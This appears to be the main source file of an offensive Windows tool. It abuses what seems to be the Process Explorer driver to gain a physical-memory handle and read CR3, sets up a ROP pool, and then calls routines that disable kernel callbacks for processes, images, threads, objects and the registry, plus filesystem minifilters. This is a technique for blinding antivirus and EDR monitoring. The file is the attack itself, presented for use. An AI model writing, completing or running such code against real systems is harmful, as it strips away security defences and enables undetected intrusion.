#include"DriverInit.h"
#include"DisableCallBack.h"

int main()
{
	ULONG64 cr3 = NULL;
	ULONG64 phyMemHandle = NULL;
	ULONG64 allocatePool = NULL;
	SetPrivilegeA(SE_DEBUG_NAME, TRUE);
	do
	{

		if (!InitFunc())
		{
#ifdef _DEBUG
			printf("InitFunc failed!\n");
#endif
			break;
		}

		if (!DriverInit())
		{
#ifdef _DEBUG
			printf("DriverInit function failed!\n");
#endif
			DriverUninit();
			break;
		}

		if (OpenProcExp())
		{
			phyMemHandle = GetPhysicalMemoryHandle();
			if (phyMemHandle)
			{	
				cr3 = GetCr3((HANDLE)phyMemHandle);
				SetCr3(cr3);
				SetPhyMem((HANDLE)phyMemHandle);
#ifdef _DEBUG
				printf("phyMemHandle handle 0x%llX cr3 0x%llX\n", phyMemHandle, cr3);
#endif		

				allocatePool = AllocateRopPool();//win7 sp1 has no rop1£¬so we allocated a memory£¨less 1709£©
			}
			else
			{
#ifdef _DEBUG
				printf("phyMemHandle get failed!\n");
#endif
			}
			CloseProcExp();
		}
		else
		{
#ifdef _DEBUG
			printf("OpenProcExp failed!\n");
#endif
		}

		DriverUninit();

		if (!phyMemHandle)
			break;

		if (!RopInit(allocatePool))
			break;

		//RopDemo((HANDLE)2124);
		//InitFunc();
#ifdef _DEBUG
		printf("Init successfully begin to disable callback !\n");
#endif

		DisablePsProcess();
		DisablePsImg();
		DisablePsThread();
		DisableObCallBack();
		DisableCm();
		DisableMinifilter();

	} while (false);

	system("pause");

	return 0;
}

